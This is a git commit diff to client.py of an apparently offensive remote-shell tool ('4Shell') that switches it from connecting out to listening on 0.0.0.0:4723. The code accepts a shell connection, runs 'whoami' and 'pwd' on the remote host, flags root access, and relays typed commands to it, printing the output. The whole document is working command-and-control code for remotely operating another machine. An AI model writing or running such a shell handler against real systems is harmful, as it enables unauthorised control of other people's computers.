3054094ee17c211c4e2e2a51e380235710d3e3e5
4cc3ss Flick <57473799+4cc3ssflick@users.noreply.github.com>
2020-05-12 11:41:52 +0630

    Changed connect mode to bind mode

--- client.py
+++ client.py
@@ -4,32 +4,40 @@ import os
 from colorama import Fore,Back
 
 def Main():
-        host = '127.0.0.1'
+        host = '0.0.0.0'
         port = 4723
          
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
         try:
-                s.connect((host,port))
-        except ConnectionRefusedError:
-                resp(1,"Connection refused!")
+            s.bind((host,port))
+            s.listen(5)
+            resp(0,"Listening connection at %s:%s" % (host,port))
+        except PermissionError:
+            resp(1,"Permission Denied!")
+            sys.exit()
+        except OSError as e:
+            if e.args[0] == 98:
+                resp(1,"Address already in use!")
                 sys.exit()
-        resp(0,"Shell has been connected with %s" % host)
+        conn, addr = s.accept()
+        resp(0, "4Shell connected with: %s" % (str(addr[0])))
         try:
-            s.send("whoami".encode())
-            user = s.recv(1024).decode().strip()
+            conn.send("whoami".encode())
+            user = conn.recv(1024).decode().strip()
             if user == "root":
                     print(f"[ {Fore.RED}ROOT{Fore.RESET} ] Shell is connected as root!")
                     euid = 0
             else:
                     print(f"[ {Fore.BLUE}USER{Fore.RESET} ] Shell is connect as user!")
                     euid = 1
-            prompt(user,euid,host,s)
+            prompt(user,euid,addr[0],conn)
             while shell != 'exit':
-                s.send(shell.encode())
-                data = s.recv(4096).decode().strip()
+                conn.sendall(shell.encode())
+                data = conn.recv(4096).decode().strip()
                 if data:
                     print(f'{Fore.RESET}{Fore.GREEN}{data}{Fore.RESET}')
-                prompt(user,euid,host,s)
+                prompt(user,euid,addr[0],conn)
         except KeyboardInterrupt:
                 resp(1,"Keyboard Interrupt!")
                 sys.exit(0)
@@ -39,10 +47,10 @@ def resp(typo,message):
         print(f"{Fore.RESET}[ {Fore.RED}ERROR{Fore.RESET} ] Exiting the shell. \n\t[\033[033m Err \033[00m: {message} ]")
     elif typo == 0:
         print(f"{Fore.RESET}[ {Fore.GREEN}OK{Fore.RESET} ] {message}")
-def prompt(user,euid, host, s):
+def prompt(user,euid, host, conn):
     global shell
-    s.send("pwd".encode())
-    pwd = s.recv(1024).decode().strip()
+    conn.sendall("pwd".encode())
+    pwd = conn.recv(1024).decode().strip()
     shell = input("\033[00m%s@%s~%s%s " % (Fore.RED+user+Fore.RESET,Fore.YELLOW+host+Fore.RESET, Fore.CYAN+pwd+Fore.RESET, "#" if euid==0 else "$"))
     while not shell:
         prompt(user,euid,host,pwd)
